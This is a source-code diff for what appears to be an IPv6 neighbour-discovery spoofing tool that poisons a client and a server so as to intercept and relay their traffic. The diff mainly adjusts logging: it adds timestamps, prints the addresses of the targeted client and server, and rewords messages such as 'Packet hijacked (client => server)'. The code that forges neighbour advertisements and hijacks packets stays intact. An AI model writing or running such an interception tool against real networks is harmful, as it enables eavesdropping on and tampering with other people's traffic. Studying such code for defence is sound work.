@@ -44,14 +44,21 @@ void termination_handler() {
 void *poison(void *destination) {
 	struct victim *dst = (struct victim *)destination;
 	char *pkt1, *pkt2;
+	char addr[INET6_ADDRSTRLEN];
 
 	if (!victim_info_complete(dst) || !victim_info_complete(&svictim)) {
 		printf("Victim not loaded correctly.\n");
 		pthread_exit(NULL);
 	}
 
+	dst->poisoned = 1;
 	printf("Starting Client and Server poisoning\n");
-	debug_cvivtim(dst);
+
+	inet_ntop(AF_INET6, &dst->ipv6, addr, INET6_ADDRSTRLEN);
+	printf("Poisoning client: %s\n", addr);
+	memset(addr, 0, INET6_ADDRSTRLEN);
+	inet_ntop(AF_INET6, &svictim.ipv6, addr, INET6_ADDRSTRLEN);
+	printf("Poisoning server: %s\n\n", addr);
 
 	pkt1 = alloc_ndadvert(&svictim, dst);
 	pkt2 = alloc_ndadvert(dst, &svictim);
@@ -66,7 +73,6 @@ void *poison(void *destination) {
 	/* FIXME: Memleaks */
 	free(pkt1);
 	free(pkt2);
-	printf("Hooray!\n");
 	pthread_exit(NULL);
 }
 
@@ -93,7 +99,6 @@ void get_victims(char *packet) {
 				if (!victim_info_complete(cvictim))
 					populate_cvictim(packet);
 				if (!cvictim->poisoned) {
-					printf("Thread de poison para o client.\n");
 					pthread_create(&pid0, NULL, poison, cvictim) ;
 				}
 			}
@@ -104,14 +109,20 @@ void get_victims(char *packet) {
 void packet_action(char *packet) {
 	struct ethhdr *eth;
 	struct ip6_hdr *ip6;
-	char *pkt;
+	char *pkt, timestamp[10];
+	time_t tt;
+	struct tm *t;
+
+	tt = time(NULL);
+	t = localtime(&tt);
+	strftime(timestamp, sizeof(timestamp), "%T", t);
 
 	eth = (struct ethhdr *)packet;
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 
 	if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
 		if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
-			printf("Packet Hijacked from client to server? >:-)\n");
+			printf("[%s] Packet hijacked (client => server)\n", timestamp);
 
 			if (opt_verbose)
 				debug_packet(packet);
@@ -122,7 +133,7 @@ void packet_action(char *packet) {
 			send_packet(packet);
 		} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
 			if (!memcmp(&(ip6->ip6_dst), &(cvictim->ipv6), sizeof(struct in6_addr))) {
-				printf("Packet Hijacked from server to client? >:-)\n");
+				printf("[%s] Packet hijacked (server => client)\n", timestamp);
 
 				if (opt_verbose)
 					debug_packet(packet);
